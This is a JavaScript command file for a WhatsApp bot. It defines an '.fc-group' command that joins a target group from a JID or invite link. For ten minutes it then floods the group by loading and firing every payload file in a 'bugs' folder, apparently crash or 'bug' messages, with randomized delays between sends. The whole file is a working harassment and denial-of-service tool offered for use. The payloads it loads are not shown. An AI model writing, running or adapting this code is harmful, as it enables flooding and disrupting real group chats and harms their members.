const { cmd } = require('../command');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'fc-group',
  desc: 'Flood target group via JID or invite link',
  category: 'bug',
  react: '🔫',
  filename: __filename
}, async (bot, mek, { arg, reply }) => {
  try {
    if (!arg) return reply('❌ Usage: .fc-group <group JID or invite link>');

    let targetJid = '';

    // Si se link WhatsApp
    if (arg.includes('chat.whatsapp.com')) {
      const inviteCode = arg.split('/').pop().split('?')[0];
      await bot.groupAcceptInvite(inviteCode);
      const metadata = await bot.groupMetadata(inviteCode);
      targetJid = metadata.id;
    } else if (arg.endsWith('@g.us')) {
      targetJid = arg;
    } else {
      return reply('❌ Invalid input. Use a group JID or a WhatsApp invite link.');
    }

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return reply('📁 No payloads found in /bugs folder.');
    }

    await reply(`🚨 *Flooding group:* ${targetJid}\n🕒 Duration: 10 minutes\n📦 Payloads: ${bugFiles.length}`);

    const endTime = Date.now() + 10 * 60 * 1000;

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(__dirname, '../bugs', file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, to) => {
              await bot.sendMessage(to, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, to) => {
              await bot.sendMessage(to, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, targetJid);
          }

        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        await new Promise(r => setTimeout(r, 300 + Math.floor(Math.random() * 400)));
      }

      await new Promise(r => setTimeout(r, 1000));
    }

    await bot.sendMessage(targetJid, {
      text: '✅ *Flooding complete.*'
    });

  } catch (err) {
    console.error('❌ fc-group error:', err);
    await reply(`❌ Error: ${err.message}`);
  }
});
